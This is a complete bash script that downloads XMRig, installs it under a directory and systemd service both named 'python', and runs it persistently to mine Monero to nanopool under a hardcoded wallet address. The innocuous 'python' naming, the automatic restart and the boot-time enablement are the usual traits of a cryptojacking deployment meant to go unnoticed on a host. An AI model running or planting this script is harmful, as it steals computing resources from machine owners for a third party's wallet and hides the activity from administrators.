#!/bin/bash

# XMRig Miner Deployment Script
# Run with sudo privileges

set -e

echo "Starting XMRig deployment..."

# Create directory
INSTALL_DIR="$HOME/python"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Download XMRig
echo "Downloading XMRig..."
wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz

# Extract
echo "Extracting archive..."
tar -xvf xmrig-6.24.0-linux-static-x64.tar.gz

# Create systemd service
echo "Creating systemd service..."
sudo tee /etc/systemd/system/python.service > /dev/null <<EOF
[Unit]
Description=XMRig Cryptocurrency Miner
After=network.target

[Service]
Type=simple
ExecStart=$INSTALL_DIR/xmrig-6.24.0/xmrig -o xmr-jp1.nanopool.org:14433 -u 48x8EuhRoWA98pg4iWanq9MC8hmo5rR1mdKxQYxNBP2oGAHfimqewodNdqswxUoW2rYjkHrcaqSUqVdA5uWaC6RLFf5yUcW --tls --coin monero
Restart=always
RestartSec=10
User=$USER
Nice=10
CPUWeight=80
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd, enable and start service
echo "Configuring service..."
sudo systemctl daemon-reload
sudo systemctl enable python
sudo systemctl start python